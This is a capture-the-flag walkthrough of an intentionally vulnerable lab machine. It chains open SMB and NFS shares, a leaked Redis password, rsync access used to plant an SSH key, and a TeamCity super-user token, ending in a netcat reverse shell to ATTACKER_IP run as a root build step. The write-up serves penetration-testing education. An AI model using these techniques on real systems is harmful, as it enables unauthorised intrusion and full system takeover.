# Scenario

VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.

- Difficulty: Easy/Medium
- Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

Note: It might take 3-5 minutes for all the services to boot.

# Enumeration

## \[+] 10.10.220.238 - vulnnet.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.220.238 vulnnet.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.220.238
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 139/445 - SMB

We use Impacket's [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) tool to try and list the available shared volumes using unauthenticated login:

```sh
smbclient --no-pass -L //$RHOSTS
```

![fa45620fda1133228a8a2aa2ba4c1597.png](/resources/162ca5c486464469a2a6cdfaa7ea212e.png)

Let's check the `shares` volume using the command:

```sh
smbclient --no-pass //$RHOSTS/shares
ls
```

![c30ab3b0470e856cbadf40d3b090b8b7.png](/resources/0f51a9bf8e8a4ae49d7e889db6b75bcf.png)

Using the `cd` command we can switch to the `temp` directory and download any files inside using `get`:

```sh
cd temp
ls
get services.txt
```

![19a81ff4922a57ce630b9c1b342f48f4.png](/resources/ad0011f1c9364b9089576c390e73321a.png)

Switch to the `data` directory and download all the files using `mget *` and enter `y` when prompted and `exit` when finished:

```sh
cd ../data
ls
mget *
exit
```

![443de66487e0a55d7fd9d5e186fb3874.png](/resources/30bce8c096c34953815a6796d152ffaf.png)

We will find the services flag in the `services.txt`:

![a3f79068d857c3c9db1eb3d58e2730d3.png](/resources/1cc3d9d39a974d87af166ffbfdf0709b.png)

Inside we get our first clue on how to proceed `business-req.txt`:

```sh
cat business-req.txt
```

```plaintext
We just wanted to remind you that weâ€™re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```

Our next clue is in `data.txt`:

```sh
cat data.txt
```

```plaintext
Purge regularly data that is not needed anymore
```

## \[+] Port 2049 - NFS

On port 2049 we will find a Network File System (NFS) which might contain more sensitive files or data.

First, we will create a directory with the `mkdir` command to mount the NFS to on our attacking machine:

```sh
mkdir nfs
```

Next, we use the `mount` command to mount the NFS:

```sh
sudo mount -t nfs vulnnet.thm: nfs
```

Using the [tree](https://linux.die.net/man/1/tree) command, we can display all files and directories recusivley in a clean format:

```sh
tree nfs
```

![1833fa796829f01ef12a212cefd348b9.png](/resources/765546345d8d414b8e7998c82560a6e4.png)

Inside `nfs/opt/conf/redis/` we will find the configuration file for the [Remote Dictionary Server (Redis)](https://en.wikipedia.org/wiki/Redis) which might contain credentials or other sensitive data. We can use the [grep](https://linux.die.net/man/1/grep) command to search for the string "`requirepass`" to look for any passwords:

```sh
cat nfs/opt/conf/redis/redis.conf | grep requirepass
```

![05a797ab9e3197b2edd83615da9039f7.png](/resources/9330e10ee9ec478ca4ee1ec400a91ecc.png)

## \[+] Port 6379 - Redis

To connect to this service, we can use the [redis-cli](https://redis.io/docs/latest/develop/connect/cli/) (install with `sudo apt-get install redis-tools`):

```sh
redis-cli -h vulnnet.thm
```

We can list the server information using the `INFO` command, but we will need to authenticate before doing so. Using the `AUTH` command along with the password we found in the `redis.conf` file will give us access to the server:

```sh
INFO
AUTH <PASSWORD>
INFO
```

![c0f8cb7b43b13158596fce50035d5b5d.png](/resources/68ba353222fc4dcab5b00cf1de670cb9.png)

At the bottom, we will find information on the database/keyspace under the `# Keyspace` section:

![8274a2d2f63a22fc46d7fb35a5cce8b0.png](/resources/cd9732406eea43ed89ceabebab806a5e.png)

We can list all the keys using `KEYS *`:

![7fcfe85856a0ba667f915b19852690d6.png](/resources/13564479362b4c2483e0a72c3368e283.png)

The internal flag can be printed using the `GET` command:

```sh
GET "internal flag"
```

![a5181738c5c8edb575fa918b62ff0036.png](/resources/56e2c090ff844cac903663e0a1df7533.png)

When we try to check certain keys like "`authlist`" we will receive an error:

```sh
GET "authlist"
```

![67daa9ea710710f789ed5bb941a413e5.png](/resources/f98d336ff774405eb76a809e0c37f4e7.png)

We can check the data type by using the `TYPE` command:

```sh
TYPE "authlist"
```

![443096a128d4f206aa82c5cb7bf3f79e.png](/resources/3513973a97314c2b82d3e5fc8c76df91.png)

For `list` data types, we will need to use `LRANGE <KEY> <START #> <END #>`:

```sh
LRANGE "authlist" 0 1000
```

![5d7855fd2e5f3844f7588faef5344f9e.png](/resources/457ac033cc884d68972d9dec26f7dbea.png)

Exit redis-cli using the `exit` command.

We can now `echo` the base64 string into `base64` with the `-d` flag to decode it into plaintext where we will find our next step into the machine:

```sh
echo "QXV[...]g==" | base64 -d
```

![7247fca3a62f17c3ab4887619044d7e3.png](/resources/4b92618dda854e91a870e9090cbe9f7b.png)

## \[+] Port 873 - Rsync

[Rsync](https://en.wikipedia.org/wiki/Rsync) is a file synchronization tool that efficiently transfers and synchronizes files between local and remote systems by only copying the differences between source and destination. It's commonly used for backups and mirroring.

We can use [Netcat](https://linux.die.net/man/1/nc) to interact with this service by running the command:

```sh
nc $RHOSTS 873
```

When connected, the server will respond with:

```plaintext
@RSYNCD: 31.0
```

We respond with the same information:

```plaintext
@RSYNCD: 31.0
```

Now, we can list the directories and/or files inside using `#list` and after the server responds with the directory listing it will close the connection:

```plaintext
#list
```

![4031e5e388d318416d54c6bc5e7bee6b.png](/resources/560ea0b9c0d54345948e7a42e30b4d72.png)

Next, we'll connect to the service again using `nc` and enter `files` to try and access the directory, but we will find that we require authentication:

```plaintext
@RSYNCD: 31.0
files
exit
```

![ecec4d80eecda85acae3811c9da7f2d1.png](/resources/8d2be0978a0b4c7bb56bb4117d2434f0.png)

To authenticate, we will use the [rsync](https://linux.die.net/man/1/rsync) command along with the password we found in the base64 string and list the directory:

```sh
rsync --list-only rsync://rsync-connect@vulnnet.thm/files
```

![e922f56b265481d0c3bb7366e2395877.png](/resources/d2b91d5b6fa441e4bf7284c6b70984e8.png)

```sh
rsync --list-only rsync://rsync-connect@vulnnet.thm/files/sys-internal/
```

![2742653b1da9b7ffad0101ee42b93b2c.png](/resources/df11e8b1cc3140e08481a92e9c306a47.png)

We can download the user flag using the `-avz` flags, `a` enables archive mode which preserves permissions, timestamps, symbolic links, and other attributes, `v` enables verbosity and `z` enables compression:

```sh
rsync -avz rsync://rsync-connect@vulnnet.thm/files/sys-internal/user.txt .
```

When we `cat` the file we will find the user flag:

![6e911f04a7398759dc9be5cfb33b747d.png](/resources/e2acbffd45b1495e839f2ce3c0ee140c.png)

# Initial Foothold

There is also the `.ssh` directory which doesn't contain any SSH keys. We can create our own SSH key and transfer the file to the `.ssh` directory which will allow us to connect via SSH.

We can create an SSH using the `ssh-keygen` command and confirm the settings when prompted:

```sh
ssh-keygen -t rsa -b 4096
```

Then, use `rsync` to upload our SSH key to the `.ssh` folder on the victim machine:

```sh
rsync -av id_rsa.pub rsync://rsync-connect@vulnnet.thm/files/sys-internal/.ssh/authorized_keys
```

## \[+] Port 22 - SSH

### \[-] sys-internal\@vulnnet-internal

Now we are ready to connect using the [ssh](https://linux.die.net/man/1/ssh) command:

```sh
ssh -i id_rsa sys-internal@vulnnet.thm
```

# Privilege Escalation

### \[-] root\@vulnnet-internal

After some enumeration, we will find the `/TeamCity` directory and processes related to [TeamCity](https://www.jetbrains.com/teamcity/):

```sh
cd /
ls -lah
```

![b5e0976981847a4997d313b5c26182f1.png](/resources/dc2ec11a8ce84a41aff9b527f756dea7.png)

```sh
ps aux | grep 'TeamCity'
```

![c7f71a9a9c31416730d550f747a08a1d.png](/resources/11da18603252486abc9132a28e48fb28.png)

To access this internal service, we will need to fortward the port via SSH on our attacking machine:

```sh
ssh -L 8111:127.0.0.1:8111 -i id_rsa sys-internal@vulnnet.thm
```

When we visit `http://127.0.0.1:8111` in our web browser we will be able to access the TeamCity log in portal where we also will find a notice:

![533a32d0dba4b72de2c03af5d2d57c5d.png](/resources/e7843220f83a4dae84d0196dbb5f1970.png)

Clicking on the link brings us to the log in page for the Super User which accepts an authentication token:

![9fba569414baf1cda86e42984e1cff8b.png](/resources/2e80bc5047cd42c9b3978779312914a3.png)

From the [TeamCity documentation](https://www.jetbrains.com/help/teamcity/super-user.html):

*"The authentication token is automatically generated on every server start. The token is printed in the server console and teamcity-server.log under the TeamCity\logs directory (search for the "Super user authentication token" text). The line is printed on the server start and on any login page submit without a username specified."*

Although we don't have access to the `teamcity-server.log` we can also try checking `/TeamCity/logs/catalina.out`. Along with using [grep](https://linux.die.net/man/1/grep) we can search for the authentication token within the log file:

```sh
cd /TeamCity/logs
cat catalina.out | grep token
```

![0547ef493539d15e9a9e403c13a714e7.png](/resources/416bc5131c684711a171918a7dee081e.png)

After pasting in the token and logging in we can access the TeamCity project page:

![8d16ed6f14b7fc35d12db03c40b3ff39.png](/resources/92435b13a8954ff69542ba95f36b2ce9.png)

Click the "Create project" button highlighted above and fill in the details:

![699fb8ea2be2403c9e2f6e2ba30ee117.png](/resources/10056fe1ee8a4723aad895ce124cf25b.png)

On the next page, click on "Create build configuration"

![7ad97d0a899533a86db6b966f4678b6e.png](/resources/00b571110c054b5490535ace5c618bfb.png)

Then fill in the required information and click the "Create" button:

![aeb8df976ebcc3231d9bf088f7819d20.png](/resources/b8c7bdeea95946678226fb215dc47819.png)

On the next step click the "Skip" button. After being redirected to the "Version Control Settings" page, click on the "Build Steps" link underneath:

![06a1c892e6a3b74b7d5c9d262b9f8b58.png](/resources/73d5c37c5f3a43b29f1e8e7de6a47d40.png)

Then click the "Add build step" button:

![75185212f3548ad4d38c133702c2f9ee.png](/resources/296d7e0e91224f9db01fcdc759a1473a.png)

Select "Command Line" as the runner type from the dropdown menu:

![6ccde53d5bf4f397e47c242e88651b5d.png](/resources/4028c91e57c44570a5e894c29e73a54f.png)

For the build script, we can use the `mkfifo` version reverse shell and click the "Save" button when finished:

```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

![7ea95a2a195488fdbdb395163a80828a.png](/resources/b3483b5958254d6f8b9a9120488e8bf7.png)

Open a new terminal on the attacking machine and start a [Netcat](https://linux.die.net/man/1/nc) listener:

```sh
nc -nvlp 4444
```

Back on the TeamCity website, click on the "Run" button towards the upper right:

![613f9faf642582d79298b39afdf18f10.png](/resources/1988fbf62bae41b088692e8b656977d4.png)

After a moment we should have a connection back on our Netcat listener and since the build agent is running as root, we have root privileges:

![97a317ac9f1a12b19291614cd1697f2a.png](/resources/71b58036cea24275abc2d293ddaa4551.png)

We can find the root flag in `/root/root.txt`:

```sh
cat /root/root.txt
```

![7533edd7fb0cc411b6f0155b5e80280b.png](/resources/ece39bf932234faf86fb497e10397e57.png)
